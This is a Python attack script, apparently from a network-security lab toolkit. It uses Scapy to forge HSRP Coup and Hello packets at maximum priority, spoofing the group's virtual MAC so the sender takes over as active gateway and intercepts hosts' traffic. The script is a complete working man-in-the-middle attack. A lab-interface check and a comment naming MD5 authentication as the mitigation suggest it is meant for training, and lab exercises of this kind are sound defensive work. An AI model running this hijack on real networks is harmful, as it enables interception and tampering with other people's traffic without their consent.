#!/usr/bin/env python3
"""FHRP: send a higher-priority HSRP Coup/Hello to become Active and
intercept the virtual gateway's traffic. Mitigation: HSRP MD5 auth."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok  # noqa: E402


def build_hsrp(scapy_all, group, virtual_ip, priority, opcode):
    from scapy.layers.hsrp import HSRP
    Ether, IP, UDP = scapy_all.Ether, scapy_all.IP, scapy_all.UDP
    # Source from the HSRP virtual MAC 00:00:0c:07:ac:<group> — this is exactly
    # how a real hijack draws the group's traffic to the attacker: the switch
    # learns the vMAC on our port, so frames the hosts send to the virtual
    # gateway land on us. It's also a valid non-zero L2 source, so the PNetLab
    # link bridge forwards it (an all-zero/unset source would be dropped by
    # br_handle_frame before reaching the peer — see common.py).
    vmac = "00:00:0c:07:ac:%02x" % (group & 0xff)
    return (Ether(src=vmac, dst="01:00:5e:00:00:02") /
            IP(dst="224.0.0.2") /
            UDP(sport=1985, dport=1985) /
            HSRP(version=0, opcode=opcode, state=16, group=group, priority=priority, virtualIP=virtual_ip))


def main():
    p = base_parser("HSRP hijack: forge a higher-priority Coup/Hello")
    p.add_argument("--group", type=int, default=1)
    p.add_argument("--virtual_ip", default="192.168.1.1")
    p.add_argument("--priority", type=int, default=255)
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_hsrp(scapy_all, args.group, args.virtual_ip, args.priority, opcode=1)
    if args.selftest:
        selftest_ok("hsrp_hijack", "HSRP Coup len=%d" % len(bytes(pkt)))
        return

    def send(n):
        opcode = 1 if n == 0 else 0  # Coup once to force election, then sustain with Hello
        scapy_all.sendp(build_hsrp(scapy_all, args.group, args.virtual_ip, args.priority, opcode),
                         iface=args.iface, verbose=0)
        status("SENT", "%s #%d group=%d vip=%s priority=%d" %
               ("Coup" if opcode == 1 else "Hello", n + 1, args.group, args.virtual_ip, args.priority))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

